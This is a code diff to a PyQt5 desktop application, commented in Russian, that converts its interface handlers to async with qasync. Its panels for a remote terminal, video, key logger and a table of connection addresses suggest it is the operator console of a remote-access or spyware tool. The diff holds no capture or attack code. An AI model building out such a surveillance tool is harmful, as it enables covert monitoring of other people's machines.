@@ -1,10 +1,12 @@
 import sys
 import sqlite3
+import asyncio
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                              QPushButton, QTextEdit, QLabel, QScrollArea, QTableWidget, 
                              QTableWidgetItem, QLineEdit)
 from PyQt5.QtCore import Qt
 from PyQt5.QtGui import QIcon
+from qasync import asyncSlot, QEventLoop
 
 
 class MainWindow(QMainWindow):
@@ -118,7 +120,8 @@ class MainWindow(QMainWindow):
     self.server_running = False
 
   #! Терминал
-  def show_terminal(self):
+  @asyncSlot()
+  async def show_terminal(self):
     """
     Отображает интерфейс терминала.
     """
@@ -135,7 +138,8 @@ class MainWindow(QMainWindow):
     self.terminal_input.returnPressed.connect(self.execute_command)
 
   #* Обработка команд
-  def execute_command(self):
+  @asyncSlot()
+  async def execute_command(self):
     """
     Обрабатывает ввод команды в терминале.
     """
@@ -155,9 +159,9 @@ class MainWindow(QMainWindow):
       else:
         self.terminal_output.append("Сервер не был запущен\n")
 
-
   #! Видео
-  def show_video(self):
+  @asyncSlot()
+  async def show_video(self):
     """
     Отображает интерфейс для видео.
     """
@@ -169,7 +173,8 @@ class MainWindow(QMainWindow):
     self.content_layout.addWidget(self.video_label)
 
   #! Key Logger
-  def show_keylogger(self):
+  @asyncSlot()
+  async def show_keylogger(self):
     """
     Отображает интерфейс для key logger-а.
     """
@@ -181,7 +186,8 @@ class MainWindow(QMainWindow):
     self.content_layout.addWidget(self.text_display)
 
   #! Информация
-  def show_info(self):
+  @asyncSlot()
+  async def show_info(self):
     """
     Отображает интерфейс для информации.
     """
@@ -217,7 +223,8 @@ class MainWindow(QMainWindow):
     self.db_connection.commit()
 
   #* Отображение
-  def show_database(self):
+  @asyncSlot()
+  async def show_database(self):
     """
     Отображает интерфейс для базы данных.
     Заполняет таблицу данными из SQLite.
@@ -277,10 +284,11 @@ class MainWindow(QMainWindow):
     self.content_layout.addWidget(self.scroll_area)
 
     # Обновляем таблицу данными из базы данных
-    self.update_table()
+    await self.update_table()
 
   #* Добавление данных в базу данных
-  def add_to_database(self):
+  @asyncSlot()
+  async def add_to_database(self):
     """
     Добавляет данные из полей ввода в базу данных.
     """
@@ -307,10 +315,11 @@ class MainWindow(QMainWindow):
     self.port_input.clear()
 
     # Обновляем таблицу
-    self.update_table()
+    await self.update_table()
 
   #* Удаление строки из базы данных
-  def delete_from_database(self):
+  @asyncSlot()
+  async def delete_from_database(self):
     """
     Удаляет строку из базы данных по указанному номеру.
     """
@@ -335,7 +344,7 @@ class MainWindow(QMainWindow):
         # Удаляем строку из базы данных
         self.cursor.execute("DELETE FROM connection_table WHERE id = ?", (ids[row_number - 1],))
         self.db_connection.commit()
-        self.update_table()  # Обновляем таблицу
+        await self.update_table()  # Обновляем таблицу
         self.delete_input.clear()  # Очищаем поле ввода
       else:
         print("Номер строки вне диапазона")
@@ -343,7 +352,8 @@ class MainWindow(QMainWindow):
       print("Ошибка: введите корректный номер строки")
 
   #* Обновление таблицы
-  def update_table(self):
+  @asyncSlot()
+  async def update_table(self):
     """
     Обновляет таблицу данными из базы данных.
     """
@@ -360,7 +370,6 @@ class MainWindow(QMainWindow):
     for row_index, row_data in enumerate(data):
       for col_index, col_data in enumerate(row_data):
         self.table_widget.setItem(row_index, col_index, QTableWidgetItem(str(col_data)))
-
 
   #* Закрытие базы данных
   def closeEvent(self, event):
@@ -380,6 +389,11 @@ class MainWindow(QMainWindow):
 
 if __name__ == "__main__":
   app = QApplication(sys.argv)
+  loop = QEventLoop(app)
+  asyncio.set_event_loop(loop)
+
   window = MainWindow()
   window.show()
-  sys.exit(app.exec_())
+
+  with loop:
+    loop.run_forever()
